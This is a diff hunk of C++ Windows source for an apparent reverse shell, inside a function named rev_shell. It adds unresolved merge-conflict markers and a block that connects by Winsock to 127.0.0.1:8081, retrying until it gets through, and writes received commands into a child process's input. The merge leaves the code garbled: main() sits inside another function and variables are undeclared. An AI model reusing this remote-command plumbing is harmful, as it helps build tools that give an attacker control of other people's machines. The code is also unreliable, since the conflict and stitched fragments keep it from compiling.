@@ -164,6 +164,68 @@ string receive_data(SOCKET clientSocket)
 
 void rev_shell()
 {
+<<<<<<< HEAD
+=======
+    int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
+
+    if (bytesSent == SOCKET_ERROR)
+        cerr << "Send failed with error: " << WSAGetLastError() << endl;
+    // else cout << "Sent data: " << data << endl;
+}
+void give_command(const std::string &command)
+{
+    string cmd = command + "\r\n";
+    // Write a command to the child process.
+    DWORD bytesWritten;
+    if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL))
+    {
+        cerr << "WriteFile failed with error code: " << GetLastError() << endl;
+    }
+    FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
+}
+
+int main()
+{
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    {
+        std::cerr << "WSAStartup failed.\n";
+        return 1;
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET)
+    {
+        std::cerr << "socket failed.\n";
+        WSACleanup();
+        return 1;
+    }
+
+    sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(8081); // Port for input socket
+    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+    bool connected = false;
+    while (!connected)
+    {
+        if (connect(sock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        {
+            std::cerr << "Connection failed. Retrying in 2 seconds...\n";
+            Sleep(2000); // Wait for 2 seconds before retrying
+        }
+        else
+        {
+            connected = true; // Successfully connected
+            std::cout << "Connected to the server!\n";
+        }
+    }
+
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+>>>>>>> f292febc70301d645abdb3ee43f2f28c10049ec7
 
     SECURITY_ATTRIBUTES saAttr = {0};
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
